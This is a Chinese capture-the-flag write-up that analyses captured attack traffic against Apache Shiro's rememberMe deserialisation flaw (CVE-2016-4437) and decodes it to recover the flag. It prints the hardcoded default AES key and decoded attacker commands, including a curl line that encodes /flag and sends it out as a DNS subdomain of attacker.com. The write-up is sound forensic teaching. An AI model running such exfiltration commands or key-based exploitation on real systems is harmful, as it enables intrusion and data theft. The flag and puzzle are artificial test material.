# ezShiro

## 题目简述

附件是一段针对 Apache Shiro `rememberMe` 反序列化环境的攻击流量。环境按 [Vulhub 的 CVE-2016-4437 配置](https://github.com/vulhub/vulhub/blob/master/shiro/CVE-2016-4437/docker-compose.yml) 搭建，流量由 [ShiroAttack2](https://github.com/SummerSec/ShiroAttack2) 发起；解题目标不是重新利用靶机，而是从 HTTP 命令通道、响应和 DNS 外带记录中恢复攻击过程与 flag。

## 解题过程

Shiro 1.2.4 的 `rememberMe` 使用硬编码默认 AES 密钥：

```text
kPH+bIxk5D2deZiIxcaaaA==
```

Cookie 中保存的是加密后的 Java 序列化数据。攻击者知道默认密钥后，可构造并加密带有反序列化 gadget 的对象；服务端解密 `rememberMe` 后执行反序列化，在类路径存在可用 gadget 时形成命令执行。抓包里的 `rememberMe` 是漏洞入口，而后续 `Authorization: Basic` 则是攻击工具/载荷使用的 Base64 命令通道，不是 Shiro 自带的命令协议。

三个关键请求头为：

```text
Authorization: Basic bHM=
Authorization: Basic Y3VybCAkKGNhdCAvZmxhZyB8IHJldiB8IHRyICdBLVphLXonICdOLVpBLU1uLXphLW0nIHwgYmFzZTY0IHwgdHIgLWQgJ1xuJykuYXR0YWNrZXIuY29t
Authorization: Basic d2hvYW1p
```

Base64 解码后依次是：

```bash
ls
curl $(cat /flag | rev | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 | tr -d '\n').attacker.com
whoami
```

响应中的 `cm9vdAo=` 解码为 `root\n`，目录列表的解码结果还包含 `flag` 和 `shirodemo-1.0-SNAPSHOT.jar`，与命令执行环境相符。第二条命令没有把 flag 放在 HTTP 响应中，而是依次执行逐行逆序、ROT13、Base64，再把结果作为 DNS 子域名外带。

DNS 查询中出现的标签是：

```text
fTBlMXVGX2dmaFd7cnpuVGswCg==
```

按命令的逆序恢复即可：

```python
import base64
import codecs

label = 'fTBlMXVGX2dmaFd7cnpuVGswCg=='
stage1 = base64.b64decode(label).decode()
stage2 = codecs.decode(stage1, 'rot_13')
flag = stage2.rstrip('\n')[::-1]
print(flag)
```

输出为：

```text
0xGame{Just_Sh1r0}
```

## 方法总结

- `rememberMe` 长 Base64 Cookie、已知默认密钥和 Java 反序列化 gadget 是 CVE-2016-4437 的关键识别链。
- 流量分析时要区分漏洞入口与利用后的通信协议；本题的 Basic Base64 字段负责传命令，DNS 查询负责带出无回显结果。
- 逆向多层编码应严格按原命令的逆序执行，并留意文件末尾换行；先去掉换行再反转，可避免 flag 前出现多余字符。
